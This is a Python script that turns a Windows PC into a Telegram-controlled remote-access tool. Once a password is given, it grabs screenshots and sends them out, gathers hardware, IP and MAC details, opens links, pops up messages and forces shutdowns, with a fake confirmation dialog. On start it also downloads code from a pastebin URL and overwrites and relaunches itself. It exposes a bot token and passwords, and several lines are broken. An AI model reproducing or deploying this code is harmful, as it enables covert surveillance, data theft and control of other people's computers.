import os
import sys
import telebot
import tempfile
from PIL import ImageGrab
import requests
import webbrowser
import urllib.parse
import pyautogui
from PIL import Image, ImageDraw
import psutil
import platform
import socket


PASTEBIN_URL = 'https://pastebin.com/raw/ВАШ_КОД'  # Ссылка на код на пастебине
CURRENT_FILE = sys.argv[0]  # Имя текущего файла

def check_for_updates():
    try:
        response = requests.get(PASTEBIN_URL)
        if response.status_code == 200:
            new_code = response.text

            with open(CURRENT_FILE, 'r', encoding='utf-8') as f:
                current_code = f.read()

            if new_code != current_code:
                with open(CURRENT_FILE, 'w', encoding='utf-8') as f:
                    f.write(new_code)

                print('Код обновлён. Перезапуск...')
                os.execv(sys.executable, ['python'] + sys.argv)
            else:
                print('Код актуален.')
        else:
            print('Ошибка загрузки обновлений с пастебина.')
    except Exception as e:
        print(f'Ошибка при проверке обновлений: {e}')


# Проверка обновлений перед запуском бота
check_for_updates()

# Твой текущий код
API_TOKEN = '6721960274:AAGWzhZpHRyKfN9LomOcv8so6lpjvRCmkCw'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, 'Введите пароль:')
    bot.register_next_step_handler(message, check_password)

def check_password(message):
    password = message.text.strip()
    if password == '11,41653494676972':
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("Получить скриншот")
        markup.add("Открыть ссылку")
        markup.add("Показать IP-адрес")
        markup.add("Шедевро крила песня")
        markup.add("Свернуть все окна")
        markup.add("Написать сообщение")
        markup.add("Инфо о пк")
        bot.send_message(message.chat.id, 'Привет! Выберите действие:', reply_markup=markup)
    elif password == 'sigma_pass_dlya_krutih228111111':
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("Получить скриншот")
        markup.add("Выключить")
        markup.add("Открыть ссылку")
        markup.add("Показать IP-адрес")
        markup.add("Шедевро крила песня")
        markup.add("Свернуть все окна")
        markup.add("Написать сообщение")
        markup.add("Инфо о пк")
        markup.add("Выключить да")
        bot.send_message(message.chat.id, 'Привет! Выберите действие:', reply_markup=markup)
    else:
        bot.send_message(message.chat.id, 'Неверный пароль. Попробуйте снова.')
        send_welcome(message)

@bot.message_handler(regexp='выключить да')
def prinud_virub(message):
    result = pyautogui.confirm(text='Выключить?', title='Подтверждение', buttons=['Да', 'Да'])

    if not result or result == 'Да':
        os.system("shutdown -s -t 3")
        pyautogui.alert("3")
        time.sleep(1)
        pyautogui.alert("2")
        time.sleep(1)
        pyautogui.alert("1")
        pass


@bot.message_handler(regexp='инфо о пк')
def system_info(message):
    bot.send_message(message.chat.id, 'Получаю инфу о пк...')

    system_info = f"Система: {platform.system()} {platform.release()}\n"
    system_info += f"Версия Python: {platform.python_version()}\n"
    system_info += f"Архитектура: {platform.architecture()[0]}\n"
    system_info += f"Имя узла сети: {platform.node()}\n"
    system_info += f"Процессор: {platform.processor()}\n"
    
    gpu_info = "Видеокарта: "
    try:
        import wmi
        w = wmi.WMI()
        for gpu in w.Win32_VideoController():
            gpu_info += f"{gpu.name}, "
    except:
        gpu_info += "Информация не доступна"
    system_info += gpu_info[:-2] + "\n" 
    
    memory_info = f"ОЗУ: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} ГБ\n"
    
    system_info += memory_info

    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        mac_address = ':'.join(['{:02x}'.format((psutil.net_if_addrs()[interface][0].address).split(':')[i]) for i in range(6)])
        network_info = f"IP-адрес: {ip_address}\nMAC-адрес: {mac_address}\n"
    except:
        network_info = "Информация о сети не доступна\n"
    system_info += network_info
    
    bot.send_message(message.chat.id, system_info)


@bot.message_handler(regexp='написать сообщение')
def send_message_dialog(message):
    bot.send_message(message.chat.id, "Введите сообщение:")
    bot.register_next_step_handler(message, send_message)

def send_message(message):
    bot.send_message(message.chat.id, f"Вы написали: {message.text}")
    msg = message.text
    pyautogui.alert(message.text)


@bot.message_handler(regexp='шедевро крила песня')
def krila(message):
    krila_url = 'https://youtu.be/-9PfcqY5jQc?si=3dRFqaH-YjzuncOi'
    bot.send_message(message.chat.id, "Включаю...")
    webbrowser.open(krila_url)

@bot.message_handler(regexp='выключить')
def echo_message(message):
    bot.send_message(message.chat.id, "Выключаю...")
    os.system("shutdown -s -t 0")

@bot.message_handler(regexp='получить скриншот')
def echo_message(message):
    path = tempfile.gettempdir() + 'screenshot.png'
    screenshot = ImageGrab.grab()
    screenshot.save(path, 'PNG')
    bot.send_message(message.chat.id, "Скриню...")
    bot.send_photo(message.chat.id, open(path, 'rb'))

@bot.message_handler(regexp='показать ip-адрес')
def get_ip_address(message):
    bot.send_message(message.chat.id, "Получаю IP-адрес...")
    ip_address = requests.get('https://api.ipify.org').text
    bot.send_message(message.chat.id, f"Ваш IP-адрес: {ip_address} ")

@bot.message_handler(regexp='свернуть все окна')
def ocna(message):
    bot.send_message(message.chat.id, "Сворачиваю...")
    bot.send_message(message.chat.id, "Все окна свернуты")
    os.system("explorer.exe shell:::{3080F90D-D7AD-11D9-BD98-0000947B0257}")

@bot.message_handler(func=lambda message: True)
def open_link(message):
    url = message.text.strip()
    if not url.startswith('http'):
        bot.send_message(message.chat.id, 'Ссылка должна начинаться на https://(и тут ссылка).')
        return
    parsed_url = urllib.parse.urlparse(url)
    if not (parsed_url.scheme and parsed_url.netloc):
        bot.send_message(message.chat.id, 'Это не похоже на ссылку.')
        return
    excluded_domains = [
        'https://kekma.net', 'https://rt.pornhub.com', 'https://pornhub.com', 'https://www.xvideos.com',
        'https://www.pornhub.com', 'https://xvideos.com', 'http://kekma.net', 'http://rt.pornhub.com',
        'http://pornhub.com', 'http://www.xvideos.com', 'https://kekma.net',
        'https://rt.pornhub.com', 'https://pornhub.com', 'https://www.xvideos.com',
        'https://www.pornhub.com', 'https://xvideos.com', '4tube.com', '8tube.xxx',
        'https://4tube.com', 'https://8tube.xxx', 'https://beeg.com', 'https://brazzers.com', 'https://drtuber.com', 
        'https://empflix.com', 'https://eporner.com', 'https://extremetube.com', 'https://fapdu.com', 'https://fapvid.com', 
        'https://fuq.com', 'https://gotporn.com', 'https://hclips.com', 'https://hdzog.com', 'https://hentaihaven.org', 
        'https://hoes.com', 'https://hottestfilms.xyz', 'https://imagefap.com', 'https://ixxx.com', 'https://keezmovies.com', 
        'https://m.porn.com', 'https://mofosex.com', 'https://motherless.com', 'https://mylust.com', 'https://myvidster.com',
        'https://nuvid.com', 'https://porn.com', 'https://pornmd.com', 'https://porntube.com', 'https://redtube.com',
        'https://spankbang.com', 'https://spankwire.com', 'https://sunporno.com', 'https://theclassicporn.com',
        'https://tnaflix.com', 'https://tubegalore.com', 'https://txxx.com', 'https://upornia.com', 'https://vid2c.com',
        'https://viewporn.com', 'https://vporn.com', 'https://wankoz.com', 'https://xhamster.com', 'https://xozilla.com',
        'https://xtube.com', 'https://youporn.com', 'https://zbporn.com' ]

    for domain in excluded_domains:
        if domain in url:
            bot.send_message(message.chat.id, 'Эта ссылка запрещена.')
        return

webbrowser.open(url)
bot.send_message(message.chat.id, 'Ссылка открыта.')

bot.polling(none_stop=True)
